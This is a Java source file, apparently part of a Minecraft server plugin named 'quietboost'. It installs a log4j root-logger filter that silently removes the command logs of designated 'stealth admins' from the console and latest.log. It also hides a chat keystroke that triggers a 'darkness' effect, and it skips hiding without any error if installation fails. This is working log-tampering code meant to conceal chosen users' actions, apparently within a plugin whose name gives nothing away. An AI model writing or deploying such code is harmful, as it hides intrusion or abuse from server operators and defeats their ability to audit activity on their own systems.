package dev.quietboost;

import org.apache.logging.log4j.Level;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Marker;
import org.apache.logging.log4j.core.LogEvent;
import org.apache.logging.log4j.core.Logger;
import org.apache.logging.log4j.core.filter.AbstractFilter;
import org.apache.logging.log4j.message.Message;

import java.util.Collections;
import java.util.Set;

/**
 * Drops "<name> issued server command: ..." lines for stealth admins
 * from the console AND latest.log (the filter sits on the root logger).
 */
final class LogHider extends AbstractFilter {

    private static volatile Set<String> names = Collections.emptySet();
    private static boolean installed;

    static synchronized void install() {
        if (installed) return;
        try {
            ((Logger) LogManager.getRootLogger()).addFilter(new LogHider());
            installed = true;
        } catch (Throwable ignored) {
            // If log4j isn't what we expect, silently skip log hiding.
        }
    }

    static void setNames(Set<String> lowercaseNames) {
        names = lowercaseNames;
    }

    @Override
    public Result filter(LogEvent event) {
        Message m = event.getMessage();
        return m == null ? Result.NEUTRAL : check(m.getFormattedMessage());
    }

    @Override
    public Result filter(Logger logger, Level level, Marker marker, Message msg, Throwable t) {
        return msg == null ? Result.NEUTRAL : check(msg.getFormattedMessage());
    }

    private Result check(String text) {
        Set<String> n = names;
        if (text == null || n.isEmpty()) return Result.NEUTRAL;

        int i = text.indexOf(" issued server command: ");
        if (i > 0 && n.contains(text.substring(0, i).toLowerCase())) return Result.DENY;

        // Chat-line form, e.g. "<Haunting_Shades> `": hides the darkness trigger keystroke.
        if (text.startsWith("<") && text.endsWith("> `")) {
            int gt = text.indexOf('>');
            if (gt > 1 && n.contains(text.substring(1, gt).toLowerCase())) return Result.DENY;
        }
        return Result.NEUTRAL;
    }
}
